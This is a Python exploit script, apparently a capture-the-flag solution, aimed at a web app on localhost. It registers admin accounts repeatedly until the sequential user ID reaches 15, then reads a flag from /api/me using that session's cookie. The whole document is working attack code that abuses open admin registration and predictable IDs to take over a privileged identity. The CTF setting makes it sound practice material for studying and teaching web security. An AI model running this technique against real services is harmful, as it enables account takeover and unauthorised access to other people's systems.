#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://localhost:3000"

# Step 1: Register initial admin account
print("[+] Registering initial admin account...")
r = requests.post(f"{BASE_URL}/api/admin/register", json={
    "username": "test@test.com",
    "password": "test123"
})
print(f"[+] Got cookie: {r.cookies.get('dev-token')}")

# Step 2: Check what userId we got
r = requests.get(f"{BASE_URL}/api/admin/me", cookies=r.cookies)
data = r.json()
current_id = data['userId']
print(f"[+] Initial userId: {current_id}")

# Step 3: Register until we get userId 15
target_id = 15
needed = target_id - current_id
print(f"[+] Need to register {needed} more accounts...")

for i in range(needed):
    r = requests.post(f"{BASE_URL}/api/admin/register", json={
        "username": f"enum{i}@test.com",
        "password": f"pass{i}"
    })
    cookies = r.cookies

# Step 4: Verify we have userId 15
r = requests.get(f"{BASE_URL}/api/admin/me", cookies=cookies)
data = r.json()
print(f"[+] Final userId: {data['userId']}")

# Step 5: Use /api/me to get the flag
r = requests.get(f"{BASE_URL}/api/me", cookies=cookies)
flag_data = r.json()
print(f"[+] Flag: {flag_data.get('flag')}")